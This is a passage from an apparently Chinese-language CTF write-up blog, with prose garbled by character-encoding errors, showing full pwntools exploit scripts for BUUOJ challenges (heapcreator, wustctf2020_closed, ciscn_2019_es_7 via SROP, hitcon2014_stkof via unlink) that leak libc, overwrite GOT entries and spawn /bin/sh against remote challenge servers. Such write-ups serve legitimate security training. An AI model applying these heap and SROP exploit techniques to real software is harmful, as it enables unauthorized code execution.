class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28078</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;heapcreator&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">length,value</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(length)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">io.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,value</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">io.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">8</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_add = u64(io.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">base = free_add - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_add))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3D-wustctf2020-closed"><a href="#0x3D-wustctf2020-closed" class="headerlink" title="0x3D.wustctf2020_closed"></a>0x3D.wustctf2020_closed</h1><p>æ„Ÿè§‰æŒºæœ‰æ„æ€çš„ä¸€ä¸ªé¢˜ï¼Œè€ƒçš„ä¸æ˜¯pwnçš„çŸ¥è¯†ï¼Œåº”è¯¥æ˜¯Linuxç›¸å…³çš„çŸ¥è¯†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HaHaHa!\nWhat else can you do???&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œcloseäº†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè™½ç„¶æœ‰äº†shellï¼Œä½†æ˜¯è·å¾—ä¸äº†è¾“å‡ºã€‚</p><p>å¯ä»¥é€šè¿‡<code>exec 1&gt;&amp;0</code>æ¥æŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦0ï¼ˆæ ‡å‡†è¾“å…¥ï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶é»˜è®¤æ˜¯å¼€å¯çš„ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°è¾“å‡ºäº†ã€‚</p><blockquote><p>  execæœ‰ä¸¤ä¸ªä½œç”¨</p><ol><li> ä»£æ›¿shellæ‰§è¡Œå‘½ä»¤ï¼ŒåŒºåˆ«æ˜¯shellæ‰§è¡Œå®Œä¹‹åä¼šå›åˆ°shellï¼Œè€Œexecä¼šç›´æ¥é€€å‡ºã€‚</li><li> æ–‡ä»¶é‡å®šå‘ï¼Œä¹Ÿå°±æ˜¯<code>exec 1&gt;&amp;0</code>è¿™æ ·å°†æ–‡ä»¶æè¿°ç¬¦ä¸º1çš„æ–‡ä»¶é‡å®šå‘åˆ°0ä¸Š</li></ol></blockquote><p>æ‰€ä»¥ï¼Œï¼Œncç„¶åexecå°±OK</p><h1 id="0x3E-ciscn-2019-es-7ï¼ˆSROPï¼‰"><a href="#0x3E-ciscn-2019-es-7ï¼ˆSROPï¼‰" class="headerlink" title="0x3E.ciscn_2019_es_7ï¼ˆSROPï¼‰"></a>0x3E.ciscn_2019_es_7ï¼ˆSROPï¼‰</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004ED ; __unwind &#123;</span><br><span class="line">.text:00000000004004ED                 push    rbp</span><br><span class="line">.text:00000000004004EE                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1                 xor     rax, rax</span><br><span class="line">.text:00000000004004F4                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:00000000004004FE                 mov     rdi, rax        ; fd</span><br><span class="line">.text:0000000000400501                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000400503                 mov     rax, 1</span><br><span class="line">.text:000000000040050A                 mov     edx, 30h ; &#x27;0&#x27;  ; count</span><br><span class="line">.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:0000000000400514                 mov     rdi, rax        ; fd</span><br><span class="line">.text:0000000000400517                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519                 retn</span><br><span class="line">.text:0000000000400519 vuln            endp ; sp-analysis failed</span><br></pre></td></tr></table></figure><p>å…¶ä¸­bufé•¿åº¦æ˜¯0x10ï¼Œä½†æ˜¯writeçš„æ—¶å€™æ‰“å°äº†0x30ä¸ªå­—ç¬¦ï¼Œå¯ä»¥æ‰“å°å‡ºåœ°å€ï¼Œè°ƒè¯•è¾“å…¥çš„å†…å®¹ä¸è¿”å›åœ°å€çš„åç§»</p><p>ä¹‹åæ ˆåœ°å€-åç§»åœ°é“è¾“å…¥çš„åœ°å€</p><p>é…åˆsrop getshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~$ cd Desktop/</span><br><span class="line">[+] Starting local process &#x27;./ciscn_2019_es_7&#x27; argv=[&#x27;./ciscn_2019_es_7&#x27;] : pid 95424</span><br><span class="line">[*] running in new terminal: /usr/bin/gdb -q  &quot;./ciscn_2019_es_7&quot; 95424</span><br><span class="line">[DEBUG] Launching a new terminal: [&#x27;/usr/bin/x-terminal-emulator&#x27;, &#x27;-e&#x27;, &#x27;/usr/bin/gdb -q  &quot;./ciscn_2019_es_7&quot; 95424&#x27;]</span><br><span class="line">[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)</span><br><span class="line">[DEBUG] Sent 0x18 bytes:</span><br><span class="line">    00000000  2f 62 69 6e  2f 73 68 00  00 00 00 00  00 00 00 00  â”‚/binâ”‚/shÂ·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000010  ed 04 40 00  00 00 00 00                            â”‚Â·Â·@Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000018</span><br><span class="line">[DEBUG] Received 0x30 bytes:</span><br><span class="line">    00000000  2f 62 69 6e  2f 73 68 00  00 00 00 00  00 00 00 00  â”‚/binâ”‚/shÂ·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000010  ed 04 40 00  00 00 00 00  36 05 40 00  00 00 00 00  â”‚Â·Â·@Â·â”‚Â·Â·Â·Â·â”‚6Â·@Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000020  58 c4 e9 87  fc 7f 00 00  00 00 00 00  01 00 00 00  â”‚XÂ·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000030</span><br><span class="line">0x7ffc87e9c458</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç®—å‡ºbinshä¸0x7ffc87e9c458çš„åœ°å€å·®0x118.</p><p>é¢ã€‚ã€‚è¦åŠ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os   = <span class="string">&#x27;linux&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å¼€å§‹æ²¡æ‡‚ï¼Œè¿˜é‡è£…äº†ä¾¿ç³»ç»Ÿï¼Œã€‚ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os   = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ciscn_2019_es_7&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">vuln_addr = <span class="number">0x04004ED</span> </span><br><span class="line">syscall_ret=<span class="number">0x400517</span></span><br><span class="line">sigreturn_addr=<span class="number">0x4004da</span><span class="comment">#__NR_rt_sigreturn</span></span><br><span class="line">system_addr=<span class="number">0x4004E2</span><span class="comment">#execve</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>+p64(vuln_addr))</span><br><span class="line">io.recv(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">stack_leak= u64(io.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh = stack_leak - <span class="number">0x118</span></span><br><span class="line">io.recv()</span><br><span class="line">sigframe = SigreturnFrame() </span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh</span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_leak</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">io.send(<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>) + p64(sigreturn_addr)+p64(syscall_ret)+<span class="built_in">str</span>(sigframe))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3F-hitcon2014-stkof-unlink"><a href="#0x3F-hitcon2014-stkof-unlink" class="headerlink" title="0x3F.hitcon2014_stkof(unlink)"></a>0x3F.hitcon2014_stkof(unlink)</h1><p>setbuf()/setvbuf()å‡½æ•°ä½œç”¨ï¼šå…³é—­I/Oç¼“å†²åŒº</p><p>ä¸€èˆ¬ä¸ºäº†è®©ç¨‹åºæ˜¾ç¤ºæ­£å¸¸ï¼Œä¼šå…³é—­I/Oç¼“å†²åŒº</p><p>ä½†æ˜¯æœ¬é¢˜æ²¡æœ‰å…³é—­ç¼“å†²åŒºï¼Œ<strong>å‡½æ•°è¿è¡Œå¼€å§‹é˜¶æ®µåœ¨fgets()å‡½æ•°ä»¥åŠprintf()å‡½æ•°è¿è¡Œçš„æ—¶å€™ï¼Œä¼šmalloc()ä¸¤å—å†…å­˜åŒºåŸŸ</strong>ã€‚å¤§å°éƒ½æ˜¯0x1000</p><p>æ‰€ä»¥ç”³è¯·çš„ç¬¬ä¸€ä¸ªchunkä¼šåŠ åœ¨è¾“å…¥è¾“å‡ºç¼“å†²åŒºä¹‹é—´ï¼Œåç»­å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( fgets(nptr, <span class="number">10</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = atoi(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = edit();</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = free_0();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = sub_400BA9();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = malloc_0();</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="number">-1</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unlinkï¼Œè®¾æŒ‡å‘å¯ UAF chunk çš„æŒ‡é’ˆçš„åœ°å€ä¸º ptr</p><ol><li> ä¿®æ”¹ fd ä¸º ptr - 0x18</li><li> ä¿®æ”¹ bk ä¸º ptr - 0x10</li><li> è§¦å‘ unlink</li></ol><p>ptr å¤„çš„æŒ‡é’ˆä¼šå˜ä¸º ptr - 0x18ã€‚</p><p>ä½¿å¾—å·²æŒ‡å‘ UAF chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18</p><p>é¦–å…ˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x1000</span>)<span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x30</span>)<span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x80</span>)<span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åç»­ unlink ä½¿ç”¨</span></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ„é€ fake chunkï¼Œå¹¶å°†ä¸‹ä¸€ä¸ªçš„prev_sizeå†™ä¸º0x30ï¼Œè¿™æ ·åé¢free(3)çš„æ—¶å€™ä¼šå°†2è¿™ä¸ªchunkåˆå¹¶ã€‚ä¹‹åchunk2å°±æ˜¯0x602140è¿™ä¸ªä½ç½®äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å°†ç¨‹åºä¸­mallocçš„åœ°å€å¤å†™ä¸ºfree_gotå’Œputs_got</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;b&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got) + p64(puts_got)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure><p>å°†free_gotä¸­å†™å…¥puts_pltè¿™æ ·freeçš„æ—¶å€™å®é™…æ‰§è¡Œçš„æ˜¯putså‡½æ•°ï¼Œæ‰“å°å‡ºputs_addr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>å†ä¹‹åå°±æ˜¯æ­£å¸¸çš„æµç¨‹äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">4</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28999</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./stkof&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x1000</span>)<span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x30</span>)<span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x80</span>)<span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&quot;b&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += 